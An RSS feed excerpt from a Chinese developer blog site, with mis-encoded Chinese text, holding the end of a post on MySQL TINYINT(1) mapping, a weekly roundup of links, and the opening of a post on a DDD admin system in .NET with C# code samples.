<p>MySQL ä¼ææ¾ç¤ºå®½åº¦ä½ä¸ºç»æéçåæ°æ®è¿åï¼æä»¥ mysql-connector-java 8.0.25 è½è·åå°</p>
</li>
<li>
<p>mysql-connector-java 8.0.25 è½ç¶ææ¾ç¤ºå®½åº¦ï¼ä¹æä¾äºé´æ¥ç¨å°æ¾ç¤ºå®½åº¦çgetObjectæ¹æ³ï¼ä½å¶ ResultSet ä¸­çæ°æ®ä¸æ°æ®åºä¸­çæ°æ®æ¯ä¸è´ç</p>
<p>è³äºä¸å±åºç¨å¦ä½ä½¿ç¨ mysql-connector-java 8.0.25 ä¸­çåæ°æ®ï¼ç±ä¸å±åºç¨å³å®ï¼spring-jdbc å°±æ¯ä¸å±åºç¨ä¹ä¸ãMyBatis ä¹æ¯</p>
</li>
<li>
<p>spring-jdbc ç JdbcTemplate.queryForRowSet ä¼é´æ¥ä½¿ç¨æ¾ç¤ºå®½åº¦ï¼è Mybatis ä¸ä¼ï¼MyBatis æç±»åå¤çå¨</p>
</li>
<li>
<p>å¦ä½é¿åæ é¢ä¸­çé®é¢ï¼æä¸­ç <strong>é®é¢å¤ç</strong> ç« èå·²ç»è¯´æï¼æ¨èç¬¬ä¸ç§æ¹å¼</p>
<blockquote>
<p>ä¸ä½¿ç¨ TINYINT(1)ï¼ç´æ¥ä½¿ç¨ TINYINT(4) æ TINYINT</p>
</blockquote>
</li>
</ol>
</object></p></li></ol>
</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-01-19 08:59">2026-01-19 08:58</span>&nbsp;
<a href="https://www.cnblogs.com/youzhibing">éç³è·¯</a>&nbsp;
éè¯»(<span id="post_view_count">32</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19498073);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19498073', targetLink: 'https://www.cnblogs.com/youzhibing/p/19498073', title: 'TINYINT(1) ç±»åçå­æ®µï¼æææ°æ®å­çæ¯ 2ï¼ä¸ºä»ä¹æ¥åºæ¥æ¯ true' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ ä¸å¨ç­ç¹åé¡¾ï¼1.12-1.18ï¼ ]]></title>
    <link>https://www.cnblogs.com/cmt/p/19499970</link>
    <guid>a9ccb711e1e9cd7bd56899b8c8a719db</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/cmt/p/19499970" title="åå¸äº 2026-01-19 08:27">
    <span role="heading" aria-level="2">ä¸å¨ç­ç¹åé¡¾ï¼1.12-1.18ï¼</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body blogpost-body-html">
<p>ç­ç¹éç¬ï¼</p>
<p> Â· <a href="https://www.cnblogs.com/sdcb/archive/2026/01/15/20261113-big-integer-dotnet-10-vs-java.html" target="_blank">ä¸æè·ä¸ªåï¼.NET 10 å¤§æ´æ°è®¡ç®å¯¹éµ Javaï¼ç»æä»¤äººæå¤</a> (<a href="https://www.cnblogs.com/sdcb/" target="_blank">.NETéªæä½</a>) <br>
 Â· <a href="https://www.cnblogs.com/dotnet-org-cn/archive/2026/01/12/19473369.html" target="_blank">ä¸ä¸ªé«æ§è½ç .NET MQTT å®¢æ·ç«¯ä¸æå¡å¨åº</a>
(<a href="https://www.cnblogs.com/dotnet-org-cn/" target="_blank">ä¸­å½.NETç ç©¶åä¼</a>)                    <br>
 Â· <a href="https://www.cnblogs.com/zxlh1529/archive/2026/01/14/19480754.html" target="_blank">æ°çä¸å¹´ï¼åç»åå®¢å­çå¤§å®¶ï¼ä¹åç»èªå·±</a>
(<a href="https://www.cnblogs.com/zxlh1529/" target="_blank">å¹¼å¿å­ææ¯å®¶</a>)                    <br>
 Â· <a href="https://www.cnblogs.com/SunSpring/archive/2026/01/13/19469874.html" target="_blank">2025æ»ç»ç¯ï¼å¿ç¢çæ¥å­éè¶è¿35å²ï¼å¼å¯ä¸ä¸ä¸ªå¾ç¨</a>
(<a href="https://www.cnblogs.com/SunSpring/" target="_blank">XSpringSun</a>)                    <br>
 Â· <a href="https://www.cnblogs.com/whuanle/archive/2026/01/12/19469026.html" target="_blank">ä¸å­é¿æè®²è§£ï¼å¢éè½å° AI è¾å©ç¼ç¨å AI Specs å®æ</a>
(<a href="https://www.cnblogs.com/whuanle/" target="_blank">ç´èå·¥è¯</a>)                    <br>
 Â· <a href="https://www.cnblogs.com/guangzan/archive/2026/01/15/19487446.html" target="_blank">AI â JSON â UI</a>
(<a href="https://www.cnblogs.com/guangzan/" target="_blank">guangzan</a>)                    <br>
 Â· <a href="https://www.cnblogs.com/sdcb/archive/2026/01/13/20251203-interleaved-thinking.html" target="_blank">ä» OpenAI å¼å®¹å° Anthropic å´èµ·ï¼å¤§æ¨¡åâäº¤éæèâåè®®çæ¼è¿ä¸åå±</a>
(<a href="https://www.cnblogs.com/sdcb/" target="_blank">.NETéªæä½</a>)                    <br>
 Â· <a href="https://www.cnblogs.com/lichengxiao/archive/2026/01/15/19485897.html" target="_blank">æ°çæç¨</a>
(<a href="https://www.cnblogs.com/lichengxiao/" target="_blank">ç¬å¤ä¸æ©ç¡</a>)                    <br>
 Â· <a href="https://www.cnblogs.com/Can-daydayup/archive/2026/01/12/19470057.html" target="_blank">è®© WinForm.NET åæ¬¡ä¼å¤§ï¼ä¸ä¸ªä¸é¨è®¾è®¡ç¨äºå¸®å© WinForms åºç¨ç¨åºè¿ç§»å° Blazor WASM å¹³å°çé¡¹ç®</a>
(<a href="https://www.cnblogs.com/Can-daydayup/" target="_blank">è¿½éæ¶åè</a>)                    <br>
 Â· <a href="https://www.cnblogs.com/lijinhuaboke/archive/2026/01/14/19457121.html" target="_blank">é«å¾·å°å¾å®ç°å®æ¶è½¨è¿¹å±ç¤º</a>
(<a href="https://www.cnblogs.com/lijinhuaboke/" target="_blank">æ­¤é¢å·®ç£ã</a>)                    <br>
 Â· <a href="https://www.cnblogs.com/Can-daydayup/archive/2026/01/13/19479370.html" target="_blank">C#/.NET/.NET Coreææ¯åæ²¿å¨å | ç¬¬ 65 æï¼2026å¹´1.1-1.11ï¼</a>
(<a href="https://www.cnblogs.com/Can-daydayup/" target="_blank">è¿½éæ¶åè</a>)                    <br>
 Â· <a href="https://www.cnblogs.com/MeteorSeed/archive/2026/01/12/19460575.html" target="_blank">ãè¯ãä½¿ç¨ Visual Studio 2026 ç®åæ¨ç Git å·¥ä½æµç¨</a>
(<a href="https://www.cnblogs.com/MeteorSeed/" target="_blank">MeteorSeed</a>)                    <br>
            </p>
<p>ç­ç¹æ°é»ï¼</p>
<p>
 Â· <a href="https://news.cnblogs.com/n/812864/" target="_blank">å AIåçå¤ªå¥½é·ç»å¢ï¼æ¶å¥æ´é80%ï¼è£å75%ï¼åªå©6ä¸ªæç»­å½ï¼ä¸ä¸ä¸ªæ¯è°ï¼</a><br>
 Â· <a href="https://news.cnblogs.com/n/813046/" target="_blank">5è¡ä»£ç ï¼é¼ç¯æ´ä¸ªç¡è°·ï¼æ¾³æ´²æ¾ç¾å¤§åï¼æå¼AIç¼ç¨å¥ç¹</a><br>
 Â· <a href="https://news.cnblogs.com/n/812874/" target="_blank">Linuxç¥å¸ç·çé¦ç°åºï¼æ¾å²è®½AIç¼ç¨æ¯åå¾ï¼å¦ä»äº²èªä¸åºæ°å´ç¼ç¨</a><br>
 Â· <a href="https://news.cnblogs.com/n/812866/" target="_blank">å¹´èª70ä¸è·è³å ååï¼ç¬¬ä¸æ¹è¢«AIåä»£çäººç±»åºç°äº</a><br>
 Â· <a href="https://news.cnblogs.com/n/812716/" target="_blank">é©¬æ¯åå®£å¸âXå°å¨7å¤©åå¬å¼ææç®æ³âï¼åæ¬æ¨èç®æ³ï¼ä»¥åæ¯åå¨1æ¬¡</a><br>
 Â· <a href="https://news.cnblogs.com/n/813044/" target="_blank">Digg éæ°ä¸çº¿</a><br>
 Â· <a href="https://news.cnblogs.com/n/812977/" target="_blank">å®æµï¼åé®Appæ¥å¥âé¿éå¨å®¶æ¡¶âï¼å¯ä»¥ç¹å¤åãè®¢è½¦ç¥¨äº</a><br>
 Â· <a href="https://news.cnblogs.com/n/812836/" target="_blank">åå­æ´æ¶¨10åï¼ææºçµèç´å¼ä¹°ä¸èµ·ï¼ä¸­å½ååçæºä¼ï¼è¿æ¬¡ççæ¥äº</a><br>
 Â· <a href="https://news.cnblogs.com/n/813054/" target="_blank">ä¸å¾äºï¼è¿ä¸ªæ°ææ¯æè§é¢åç¼©å°äº0.02%ï¼</a><br>
 Â· <a href="https://news.cnblogs.com/n/812777/" target="_blank">æºç¨æ·±å¤åç¦»èéç¥ç­ä¿¡ï¼åè¢«æ¾æ¸ä¸ºä¹é¾äºä»¶</a><br>
 Â· <a href="https://news.cnblogs.com/n/812851/" target="_blank">KANä¸ä½åå­é¸£åå½ä»»æï¼æ¸åå®ç½çç« è®¤è¯äº</a><br>
 Â· <a href="https://news.cnblogs.com/n/813045/" target="_blank">è¢«å¤è¿æ³çAIä»²è£æ¡ï¼æå¼äºææ¯è£åçé®ç¾å¸</a></p>
</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-01-19 08:28">2026-01-19 08:27</span>&nbsp;
<a href="https://www.cnblogs.com/cmt">åå®¢å­å¢é</a>&nbsp;
éè¯»(<span id="post_view_count">0</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19499970);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19499970', targetLink: 'https://www.cnblogs.com/cmt/p/19499970', title: 'ä¸å¨ç­ç¹åé¡¾ï¼1.12-1.18ï¼' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ åºäºNetCorePal Cloud FrameworkçDDDæ¶æç®¡çç³»ç»å®è·µ ]]></title>
    <link>https://www.cnblogs.com/aishangyipiyema/p/19499381</link>
    <guid>4e28d813269167c6d9e6eb05974a7a3f</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/aishangyipiyema/p/19499381" title="åå¸äº 2026-01-18 22:57">
    <span role="heading" aria-level="2">åºäºNetCorePal Cloud FrameworkçDDDæ¶æç®¡çç³»ç»å®è·µ</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h1 id="åºäºnetcorepal-cloud-frameworkçdddæ¶æç®¡çç³»ç»å®è·µ">åºäºNetCorePal Cloud FrameworkçDDDæ¶æç®¡çç³»ç»å®è·µ</h1>
<p>åæ®µæ¶é´å¨åä¸ä¸ªç®¡çç³»ç»çé¡¹ç®ï¼æ³å°è¯ä¸ä¸DDDæ¶æå¨å®éé¡¹ç®ä¸­çåºç¨ãç»è¿ä¸çªè°ç ï¼æç»éæ©äºNetCorePal Cloud Frameworkä½ä¸ºåºç¡æ¡æ¶ï¼ç»å.NET 10åVue 3æ­å»ºäºä¸å¥å®æ´çååç«¯åç¦»æ¶æãä»å¤©å°±æ³åå¤§å®¶åäº«ä¸ä¸è¿ä¸ªé¡¹ç®çæ¶æè®¾è®¡åææ¯éåï¼å¸æè½ç»æ­£å¨åç±»ä¼¼é¡¹ç®çæåä¸äºåèã</p>
<p>é¡¹ç®æºç å°åï¼<a href="https://github.com/zhouda1fu/Ncp.Admin" target="_blank" rel="noopener nofollow">https://github.com/zhouda1fu/Ncp.Admin</a></p>
<h2 id="é¡¹ç®æ¦è¿°">é¡¹ç®æ¦è¿°</h2>
<p>è¿ä¸ªé¡¹ç®æ¯ä¸ä¸ªå¸åçä¼ä¸çº§ç®¡çç³»ç»ï¼åå«äºç¨æ·ãè§è²ãé¨é¨ç­åºç¡åè½æ¨¡åãå¨ææ¯éåä¸ï¼éç¨äºç®åæ¯è¾ä¸»æµçææ¯æ ï¼</p>
<p>åç«¯æ¹é¢ï¼ä½¿ç¨.NET 10ä½ä¸ºä¸»è¦æ¡æ¶ï¼éåEF Coreåæ°æ®è®¿é®ï¼FastEndpointsæ¿ä»£ä¼ ç»çControllerï¼MediatRå®ç°CQRSæ¨¡å¼ãæ°æ®å­å¨æ¯æMySQLãPostgreSQLåSQL Serverï¼æ¶æ¯éåéæ©äºRabbitMQï¼éè¿CAPæ¡æ¶éæï¼ï¼ç¼å­ç¨Redisï¼è¿éæäº.NET Aspireæ¥åäºåççåºç¡è®¾æ½ç®¡çã</p>
<p>åç«¯é¨ååºäºVben Adminï¼è¿æ¯ä¸ä¸ªéå¸¸ä¼ç§çVue 3 + TypeScript + Viteçç®¡çåå°æ¨¡æ¿ï¼UIç»ä»¶ç¨çæ¯Ant Design Vueï¼æ´ä½ä½éªä¸éã</p>
<h2 id="æ¶æè®¾è®¡">æ¶æè®¾è®¡</h2>
<h3 id="åå±æ¶æ">åå±æ¶æ</h3>
<p>æ´ä¸ªé¡¹ç®éç¨äºç»å¸çä¸å±æ¶æï¼è¿ä¸ªç»æåºè¯¥å¾å¤åDDDçæåé½æ¯è¾çæãä¸å±ä¹é´çä¾èµå³ç³»æ¯ååçï¼Webå±ä¾èµInfrastructureå±ï¼Infrastructureå±ä¾èµDomainå±ï¼Domainå±ä½ä¸ºæ ¸å¿ï¼ä¸ä¾èµä»»ä½å¶ä»å±ã</p>
<pre><code>Ncp.Admin
âââ Domainï¼é¢åå±ï¼
â   âââ AggregatesModelï¼èåæ¨¡åï¼
â   âââ DomainEventsï¼é¢åäºä»¶ï¼
âââ Infrastructureï¼åºç¡è®¾æ½å±ï¼
â   âââ EntityConfigurationsï¼å®ä½éç½®ï¼
â   âââ Repositoriesï¼ä»å¨å®ç°ï¼
âââ Webï¼è¡¨ç°å±ï¼
    âââ Applicationï¼åºç¨æå¡å±ï¼
    â   âââ Commandsï¼å½ä»¤ï¼
    â   âââ Queriesï¼æ¥è¯¢ï¼
    â   âââ DomainEventHandlersï¼é¢åäºä»¶å¤çå¨ï¼
    âââ Endpointsï¼APIç«¯ç¹ï¼
</code></pre>
<p>è¿ç§åå±çå¥½å¤æ¯èè´£æ¸æ°ï¼Domainå±åªå³æ³¨ä¸å¡é»è¾ï¼Infrastructureå±è´è´£ææ¯å®ç°ï¼Webå±å¤çHTTPè¯·æ±åååºã</p>
<h3 id="æ ¸å¿è®¾è®¡æ¨¡å¼">æ ¸å¿è®¾è®¡æ¨¡å¼</h3>
<h4 id="1-é¢åé©±å¨è®¾è®¡ddd">1. é¢åé©±å¨è®¾è®¡ï¼DDDï¼</h4>
<p>å¨è¿ä¸ªé¡¹ç®ä¸­ï¼DDDä¸»è¦ä½ç°å¨èåæ ¹çè®¾è®¡ä¸ãæ¯ä¸ªèåæ ¹é½æèªå·±çä¸å¡è¾¹çï¼ç¶æåªè½éè¿ä¸å¡æ¹æ³æ¥ä¿®æ¹ãå°±æ¿é¨é¨è¿ä¸ªèåæ ¹æ¥è¯´å§ï¼</p>
<pre><code class="language-csharp">/// &lt;summary&gt;
/// é¨é¨IDï¼å¼ºç±»åIDï¼
/// &lt;/summary&gt;
public partial record DeptId : IInt64StronglyTypedId;

/// &lt;summary&gt;
/// é¨é¨èåæ ¹
/// &lt;/summary&gt;
public class Dept : Entity&lt;DeptId&gt;, IAggregateRoot
{
    public string Name { get; private set; } = string.Empty;
    public string Remark { get; private set; } = string.Empty;
    public DeptId ParentId { get; private set; } = default!;
    public int Status { get; private set; } = 1;
    
   
    protected Dept() { }
    
    // ä¸å¡æ¹æ³ï¼æ´æ°é¨é¨ä¿¡æ¯
    public void UpdateInfo(string name, string remark, DeptId parentId, int status)
    {
        Name = name;
        Remark = remark;
        ParentId = parentId;
        Status = status;
        UpdateTime = new UpdateTime(DateTimeOffset.UtcNow);
        
        // åå¸é¢åäºä»¶
        AddDomainEvent(new DeptInfoChangedDomainEvent(this));
    }
    
    // è½¯å é¤
    public void SoftDelete()
    {
        if (IsDeleted)
        {
            throw new KnownException("é¨é¨å·²ç»è¢«å é¤");
        }
        IsDeleted = true;
        UpdateTime = new UpdateTime(DateTimeOffset.UtcNow);
    }
}
</code></pre>
<p>è¿éæå ä¸ªè®¾è®¡ç¹æè§å¾å¼å¾è¯´ä¸ä¸ãé¦åæ¯å¼ºç±»åIDï¼æ¯å¦<code>DeptId</code>ï¼è¿æ ·å¯ä»¥é¿åæé¨é¨IDåç¨æ·IDææ··ï¼ç¼è¯å¨å°±è½å¸®ä½ æ£æ¥åºæ¥ãå¶æ¬¡æ¯å±æ§é½ç¨<code>private set</code>ï¼å¤é¢ä¸è½ç´æ¥ä¿®æ¹ï¼å¿é¡»éè¿ä¸å¡æ¹æ³ï¼è¿æ ·å°±ä¿è¯äºä¸å¡è§åçä¸è´æ§ãå¦å¤ï¼å½é¨é¨ä¿¡æ¯åæ´æ¶ä¼åå¸é¢åäºä»¶ï¼è¿æ ·å¯ä»¥éç¥å¶ä»éè¦åæ­¥æ´æ°çå°æ¹ï¼æ¯å¦ç¨æ·è¡¨ä¸­çé¨é¨åç§°ã</p>
<h4 id="2-cqrsæ¨¡å¼å½ä»¤æ¥è¯¢èè´£åç¦»">2. CQRSæ¨¡å¼ï¼å½ä»¤æ¥è¯¢èè´£åç¦»ï¼</h4>
<p>CQRSå¨è¿ä¸ªé¡¹ç®ä¸­ä¸»è¦ä½ç°å¨è¯»ååç¦»ä¸ãåæä½éè¿å½ä»¤ï¼Commandï¼æ¥å¤çï¼è¯»æä½éè¿æ¥è¯¢ï¼Queryï¼æ¥å¤çãè¿æ ·åçå¥½å¤æ¯èè´£æ¸æ°ï¼èä¸å¯ä»¥éå¯¹ä¸åçåºæ¯åä¼åã</p>
<p>åæä½è¿è¾¹ï¼å½ä»¤çå®ä¹å¾ç®åï¼å°±æ¯ä¸ä¸ªrecordãæ¯ä¸ªå½ä»¤é½æå¯¹åºçéªè¯å¨åå¤çå¨ãçä¸ä¸ªåå»ºé¨é¨çä¾å­ï¼</p>
<pre><code class="language-csharp">/// &lt;summary&gt;
/// åå»ºé¨é¨å½ä»¤
/// &lt;/summary&gt;
public record CreateDeptCommand(string Name, string Remark, DeptId? ParentId, int Status) 
    : ICommand&lt;DeptId&gt;;

/// &lt;summary&gt;
/// å½ä»¤éªè¯å¨
/// &lt;/summary&gt;
public class CreateDeptCommandValidator : AbstractValidator&lt;CreateDeptCommand&gt;
{
    public CreateDeptCommandValidator(DeptQuery deptQuery)
    {
        RuleFor(d =&gt; d.Name).NotEmpty().WithMessage("é¨é¨åç§°ä¸è½ä¸ºç©º");
        RuleFor(d =&gt; d.Name)
            .MustAsync(async (n, ct) =&gt; !await deptQuery.DoesDeptExist(n, ct))
            .WithMessage(d =&gt; $"è¯¥é¨é¨å·²å­å¨ï¼Name={d.Name}");
        RuleFor(d =&gt; d.Status).InclusiveBetween(0, 1).WithMessage("ç¶æå¼å¿é¡»ä¸º0æ1");
    }
}

/// &lt;summary&gt;
/// å½ä»¤å¤çå¨
/// &lt;/summary&gt;
public class CreateDeptCommandHandler(IDeptRepository deptRepository) 
    : ICommandHandler&lt;CreateDeptCommand, DeptId&gt;
{
    public async Task&lt;DeptId&gt; Handle(CreateDeptCommand request, CancellationToken cancellationToken)
    {
        var parentId = request.ParentId ?? new DeptId(0);
        var dept = new Dept(request.Name, request.Remark, parentId, request.Status);
        
        await deptRepository.AddAsync(dept, cancellationToken);
        
        // æ³¨æï¼ä¸éè¦æå¨è°ç¨SaveChangesï¼æ¡æ¶ä¼èªå¨å¤ç
        return dept.Id;
    }
}
</code></pre>
<p>éªè¯å¨è¿éç¨äºFluentValidationï¼æ¯æåæ­¥åå¼æ­¥éªè¯ãæ¯å¦æ£æ¥é¨é¨åç§°æ¯å¦å·²å­å¨è¿ç§éè¦æ¥æ°æ®åºçéªè¯ï¼å°±å¯ä»¥ç¨å¼æ­¥ç<code>MustAsync</code>ã</p>
<p>è¯»æä½è¿è¾¹ï¼ç´æ¥ä½¿ç¨DbContextï¼èä¸å¯ä»¥ç¨æå½±æ¥ä¼åæ§è½ãæ¯å¦è·åé¨é¨æ çæ¶åï¼åªéæ©éè¦çå­æ®µï¼</p>
<pre><code class="language-csharp">/// &lt;summary&gt;
/// é¨é¨æ¥è¯¢æå¡
/// &lt;/summary&gt;
public class DeptQuery(ApplicationDbContext applicationDbContext) : IQuery
{
    private DbSet&lt;Dept&gt; DeptSet { get; } = applicationDbContext.Depts;
    
    /// &lt;summary&gt;
    /// è·åé¨é¨æ ï¼ä½¿ç¨æå½±ä¼åæ§è½ï¼
    /// &lt;/summary&gt;
    public async Task&lt;IEnumerable&lt;DeptTreeDto&gt;&gt; GetDeptTreeAsync(
        bool includeInactive = false, 
        CancellationToken cancellationToken = default)
    {
        // ä½¿ç¨æå½±åªéæ©éè¦çå­æ®µï¼åå°åå­å ç¨
        var allDepts = await DeptSet.AsNoTracking()
            .WhereIf(!includeInactive, d =&gt; d.Status != 0)
            .Select(d =&gt; new DeptTreeNode
            {
                Id = d.Id,
                Name = d.Name,
                Remark = d.Remark,
                ParentId = d.ParentId,
                Status = d.Status,
                CreatedAt = d.CreatedAt
            })
            .ToListAsync(cancellationToken);
        
        // å¨åå­ä¸­æå»ºæ å½¢ç»æ
        return BuildTreeStructure(allDepts);
    }
}
</code></pre>
<p>è¿æ ·è¯»ååç¦»çå¥½å¤æ¯ï¼æ¥è¯¢è¿è¾¹å¯ä»¥éå¯¹ä¸åçæ¥è¯¢åºæ¯åä¼åï¼æ¯å¦ç¨æå½±åå°åå­å ç¨ï¼æèå°æ¥å¯ä»¥å ç¼å­ãç¨è¯»åºç­ï¼èä¸ä¼å½±ååæä½çé»è¾ã</p>
<h4 id="3-äºä»¶é©±å¨æ¶æ">3. äºä»¶é©±å¨æ¶æ</h4>
<p>äºä»¶é©±å¨è¿åï¼é¡¹ç®å®ç°äºé¢åäºä»¶åéæäºä»¶ä¸¤ç§æºå¶ãé¢åäºä»¶ä¸»è¦ç¨äºèååé¨çåæ­¥æä½ï¼éæäºä»¶ç¨äºè·¨æå¡éä¿¡ã</p>
<p>æ¯å¦è¯´ï¼å½é¨é¨ä¿¡æ¯åæ´çæ¶åï¼éè¦åæ­¥æ´æ°ç¨æ·è¡¨ä¸­çé¨é¨åç§°ãè¿ä¸ªè¿ç¨å°±å¯ä»¥éè¿é¢åäºä»¶æ¥å®ç°ï¼</p>
<pre><code class="language-csharp">/// &lt;summary&gt;
/// é¨é¨ä¿¡æ¯åæ´é¢åäºä»¶
/// &lt;/summary&gt;
public record DeptInfoChangedDomainEvent(Dept Dept) : IDomainEvent;
</code></pre>
<p>ç¶åå¨äºä»¶å¤çå¨ä¸­å¤çè¿ä¸ªé»è¾ï¼</p>
<pre><code class="language-csharp">/// &lt;summary&gt;
/// é¨é¨ä¿¡æ¯åæ´é¢åäºä»¶å¤çå¨ - ç¨äºæ´æ°ç¨æ·é¨é¨åç§°
/// &lt;/summary&gt;
public class DeptInfoChangedDomainEventHandlerForUpdateUserDeptName(
    IMediator mediator, 
    UserQuery userQuery) 
    : IDomainEventHandler&lt;DeptInfoChangedDomainEvent&gt;
{
    public async Task Handle(DeptInfoChangedDomainEvent domainEvent, CancellationToken cancellationToken)
    {
        var dept = domainEvent.Dept;
        var deptId = dept.Id;
        var newDeptName = dept.Name;
        
        // æ¥è¯¢ææå±äºè¯¥é¨é¨çç¨æ·ID
        var userIds = await userQuery.GetUserIdsByDeptIdAsync(deptId, cancellationToken);
        
        // éè¿Commandæ´æ°æ¯ä¸ªç¨æ·çé¨é¨åç§°ï¼èä¸æ¯ç´æ¥æä½æ°æ®åºï¼
        foreach (var userId in userIds)
        {
            var command = new UpdateUserDeptNameCommand(userId, newDeptName);
            await mediator.Send(command, cancellationToken);
        }
    }
}
</code></pre>
<p>è¿æ ·è®¾è®¡çå¥½å¤æ¯ï¼é¨é¨èååç¨æ·èåä¹é´æ²¡æç´æ¥ä¾èµï¼éè¿äºä»¶æ¥éä¿¡ãå¦æå°æ¥éè¦å¢å æ°çä¸å¡é»è¾ï¼æ¯å¦é¨é¨åæ´æ¶è¦åééç¥ï¼åªéè¦åå ä¸ä¸ªäºä»¶å¤çå¨å°±è¡äºï¼ä¸éè¦æ¹ç°æçä»£ç ã</p>
<h4 id="4-fastendpointsè½»éçº§apiæ¡æ¶">4. FastEndpointsè½»éçº§APIæ¡æ¶</h4>
<p>å¨APIè®¾è®¡è¿åï¼é¡¹ç®éæ©äºFastEndpointsèä¸æ¯ä¼ ç»çControllerãä¸»è¦æ¯è§å¾FastEndpointsçä»£ç æ´ç®æ´ï¼æ§è½ä¹æ´å¥½ãä¸ä¸ªç«¯ç¹å°±æ¯ä¸ä¸ªç±»ï¼èè´£æ¸æ°ã</p>
<p>çä¸ä¸ªåå»ºé¨é¨çä¾å­ï¼</p>
<pre><code class="language-csharp">/// &lt;summary&gt;
/// åå»ºé¨é¨çAPIç«¯ç¹
/// &lt;/summary&gt;
[Tags("Depts")]
public class CreateDeptEndpoint(IMediator mediator) 
    : Endpoint&lt;CreateDeptRequest, ResponseData&lt;CreateDeptResponse&gt;&gt;
{
    public override void Configure()
    {
        Post("/api/admin/dept");
        AuthSchemes(JwtBearerDefaults.AuthenticationScheme);
        Permissions(PermissionCodes.AllApiAccess, PermissionCodes.DeptCreate);
    }
    
    public override async Task HandleAsync(CreateDeptRequest req, CancellationToken ct)
    {
        var cmd = new CreateDeptCommand(req.Name, req.Remark, req.ParentId, req.Status);
        var deptId = await mediator.Send(cmd, ct);
        var response = new CreateDeptResponse(deptId, req.Name, req.Remark);
        await Send.OkAsync(response.AsResponseData(), cancellation: ct);
    }
}
</code></pre>
<p>ä»£ç å¾ç®æ´ï¼ä¸ä¸ªç±»å°±æè·¯ç±ãè®¤è¯ãæéé½éç½®å¥½äºãè¯·æ±åååºé½æ¯å¼ºç±»åçï¼ç±»åå®å¨æä¿éãèä¸æµè¯èµ·æ¥ä¹å¾æ¹ä¾¿ï¼ä¸éè¦å¯å¨HTTPæå¡å¨ï¼ç´æ¥æµç«¯ç¹å°±è¡äºã</p>
<h2 id="å ä¸ªæ ¸å¿ç¹æ§">å ä¸ªæ ¸å¿ç¹æ§</h2>
<h3 id="1-å¼ºç±»åid">1. å¼ºç±»åID</h3>
<p>è¿ä¸ªé¡¹ç®éææèåæ ¹é½ç¨å¼ºç±»åIDï¼èä¸æ¯ç´æ¥ç¨<code>long</code>æ<code>int</code>ãæ¯å¦é¨é¨IDæ¯<code>DeptId</code>ï¼ç¨æ·IDæ¯<code>UserId</code>ãè¿æ ·åçå¥½å¤æ¯ç¼è¯å¨è½å¸®ä½ æ£æ¥ç±»åéè¯¯ï¼ä¸ä¼æé¨é¨IDåç¨æ·IDææ··ã</p>
<p>ä½¿ç¨èµ·æ¥ä¹å¾ç®åï¼</p>
<pre><code class="language-csharp">// å®ä¹å¼ºç±»åID
public partial record DeptId : IInt64StronglyTypedId;

// ä½¿ç¨å¼ºç±»åID
var deptId = new DeptId(123);
var parentId = request.ParentId ?? new DeptId(0);
</code></pre>
<p>æ¡æ¶ä¼èªå¨å¤çåºåååç±»åè½¬æ¢ï¼ç¨èµ·æ¥å¾é¡ºæã</p>
<h3 id="2-ä»å¨æ¨¡å¼">2. ä»å¨æ¨¡å¼</h3>
<p>ä»å¨è¿åï¼åæä½éè¿ä»å¨æ¥å¤çï¼æ¥è¯¢æä½ç´æ¥ä½¿ç¨DbContextãä»å¨çå®ç°å¾ç®åï¼</p>
<pre><code class="language-csharp">/// &lt;summary&gt;
/// é¨é¨ä»å¨æ¥å£
/// &lt;/summary&gt;
public interface IDeptRepository : IRepository&lt;Dept, DeptId&gt; { }

/// &lt;summary&gt;
/// é¨é¨ä»å¨å®ç°
/// &lt;/summary&gt;
public class DeptRepository(ApplicationDbContext context) 
    : RepositoryBase&lt;Dept, DeptId, ApplicationDbContext&gt;(context), 
      IDeptRepository { }
</code></pre>
<p>æ¡æ¶ä¼èªå¨ç®¡çäºå¡åSaveChangesï¼å½ä»¤å¤çå¨éä¸éè¦æå¨è°ç¨ï¼è¿æ ·ä»£ç æ´ç®æ´ï¼ä¹ä¸å®¹æåºéã</p>
<h3 id="3-éªè¯æºå¶">3. éªè¯æºå¶</h3>
<p>éªè¯ç¨çæ¯FluentValidationï¼æ¯æåæ­¥åå¼æ­¥éªè¯ãæ¯å¦åå»ºé¨é¨çæ¶åï¼éè¦æ£æ¥é¨é¨åç§°æ¯å¦å·²å­å¨ï¼å°±å¯ä»¥ç¨å¼æ­¥éªè¯ï¼</p>
<pre><code class="language-csharp">public class CreateDeptCommandValidator : AbstractValidator&lt;CreateDeptCommand&gt;
{
    public CreateDeptCommandValidator(DeptQuery deptQuery)
    {
        RuleFor(d =&gt; d.Name).NotEmpty().WithMessage("é¨é¨åç§°ä¸è½ä¸ºç©º");
        // å¼æ­¥éªè¯ï¼æ£æ¥é¨é¨åç§°æ¯å¦å·²å­å¨
        RuleFor(d =&gt; d.Name)
            .MustAsync(async (n, ct) =&gt; !await deptQuery.DoesDeptExist(n, ct))
            .WithMessage(d =&gt; $"è¯¥é¨é¨å·²å­å¨ï¼Name={d.Name}");
    }
}
</code></pre>
<h3 id="4-å¼å¸¸å¤ç">4. å¼å¸¸å¤ç</h3>
